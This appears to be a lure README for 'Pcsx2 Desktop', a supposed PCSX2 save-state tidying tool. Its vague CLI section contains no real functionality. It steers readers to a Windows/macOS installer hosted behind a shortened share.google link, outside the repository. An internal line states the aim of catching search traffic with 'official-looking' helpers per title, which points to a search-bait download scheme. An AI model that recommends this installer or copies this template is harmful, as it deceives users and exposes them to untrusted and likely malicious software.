![Pcsx2 Desktop](assets/hero.png)

# Pcsx2 Desktop

*Keep the Pcsx2 save-state folder tidy before an update.*

## About

This repository is **Pcsx2 Desktop**, a Windows utility. Keep the Pcsx2 save-state folder tidy before an update.

Patches move Pcsx2 save-state paths without warning.

The CLI in this repository is the documented interface; the desktop build is the same job in an installer.

## What's included

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Highlights

- Locates Pcsx2 user data on Windows and macOS.
- Archives save-state folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## The problem

Search traffic for Pcsx2 is the product name plus desktop.

Keep one official-looking helper per title.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/colelee-1383/pcsx2-desktop

MIT license. See `LICENSE`.
